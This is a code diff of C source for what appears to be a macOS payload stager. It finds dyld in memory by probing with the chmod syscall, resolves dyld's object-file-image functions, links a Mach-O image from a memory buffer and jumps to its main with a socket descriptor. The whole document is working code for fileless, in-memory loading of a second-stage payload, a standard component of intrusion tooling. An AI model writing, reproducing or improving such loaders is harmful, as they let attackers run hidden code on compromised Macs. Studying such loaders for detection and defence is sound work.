@@ -20,9 +20,11 @@
 typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
 typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);
 
-uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer);
+typedef NSSymbol (*NSLookupSymbolInModule_ptr)(NSModule module, const char *symbolName);
+typedef void * (*NSAddressOfSymbol_ptr)(NSSymbol symbol);
+
+uint64_t find_macho(uint64_t addr, unsigned int increment);
 uint64_t find_symbol(uint64_t base, char* symbol);
-uint64_t find_entry_offset(struct mach_header_64 *mh);
 int string_compare(const char* s1, const char* s2);
 int detect_sierra();
 
@@ -52,20 +54,24 @@ int main(int argc, char** argv)
   int sierra = detect_sierra();
   uint64_t binary = DYLD_BASE_ADDR;
   if (sierra) {
-    binary = find_macho(0x100000000, 0x1000, 0);
+    binary = find_macho(0x100000000, 0x1000);
     if (!binary) {
       return 1;
     }
     binary += 0x1000;
   }
-  uint64_t dyld = find_macho(binary, 0x1000, 0);
+  uint64_t dyld = find_macho(binary, 0x1000);
   if (!dyld) {
     return 1;
   }
 
   NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
   if (!NSCreateObjectFileImageFromMemory_func) {
-    return 1;
+    dyld = find_macho(dyld + 0x1000, 0x1000);
+    NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
+    if (!NSCreateObjectFileImageFromMemory_func) {
+      return 1;
+    }
   } 
 #ifdef DEBUG
   print("good symbol!\n");
@@ -76,9 +82,21 @@ int main(int argc, char** argv)
     return 1;
   } 
 
+  NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = (void*)find_symbol(dyld, "_NSLookupSymbolInModule");
+  if (!NSLookupSymbolInModule_func) {
+    return 1;
+  }
+
+  NSAddressOfSymbol_ptr NSAddressOfSymbol_func = (void*)find_symbol(dyld, "_NSAddressOfSymbol");
+  if (!NSAddressOfSymbol_func) {
+    return 1;
+  }
+
   if (!sierra) {
     NSCreateObjectFileImageFromMemory_func -= DYLD_BASE_ADDR;
     NSLinkModule_func -= DYLD_BASE_ADDR;
+    NSLookupSymbolInModule_func -= DYLD_BASE_ADDR;
+    NSAddressOfSymbol_func -= DYLD_BASE_ADDR;
   }
 
   /*if (*(char*)buffer == 'b') {*/
@@ -106,15 +124,21 @@ int main(int argc, char** argv)
   print("good nm!\n");
 #endif
 
-  uint64_t execute_base = (uint64_t)nm;
-  execute_base = find_macho(execute_base, sizeof(int), 1);
-
-  uint64_t entry_off = find_entry_offset((void*)execute_base);
-  if (!entry_off) {
+  NSSymbol sym_main = NSLookupSymbolInModule_func(nm, "_main");
+  if (!sym_main) {
     return 1;
   }
-  uint64_t entry = (execute_base + entry_off);
-  int(*main_func)(int, char**) = (int(*)(int, char**))entry;
+
+  void * addr_main = NSAddressOfSymbol_func(sym_main);
+  if (!addr_main) {
+    return 1;
+  }
+
+#ifdef DEBUG
+  print("found main!\n");
+#endif
+
+  int(*main_func)(int, char**) = (int(*)(int, char**))addr_main;
   char* socket = (char*)(size_t)argc;
   char *new_argv[] = { "m", socket, NULL };
   int new_argc = 2;
@@ -187,13 +211,10 @@ uint64_t syscall_chmod(uint64_t path, long mode)
   return ret;
 }
 
-uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer) 
+uint64_t find_macho(uint64_t addr, unsigned int increment)
 {
   while(1) {
     uint64_t ptr = addr;
-    if (pointer) {
-      ptr = *(uint64_t *)ptr;
-    }
     unsigned long ret = syscall_chmod(ptr, 0777);
     if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
       return ptr;
@@ -201,22 +222,6 @@ uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer)
 
     addr += increment;
   }
-  return 0;
-}
-
-uint64_t find_entry_offset(struct mach_header_64 *mh)
-{
-  struct entry_point_command *entry;
-  struct load_command *lc = (struct load_command *)((void*)mh + sizeof(struct mach_header_64));
-  for (int i=0; i<mh->ncmds; i++) {
-    if (lc->cmd == LC_MAIN) {
-      entry = (struct entry_point_command *)lc;
-      return entry->entryoff;
-    }
-
-    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
-  }
-
   return 0;
 }
 
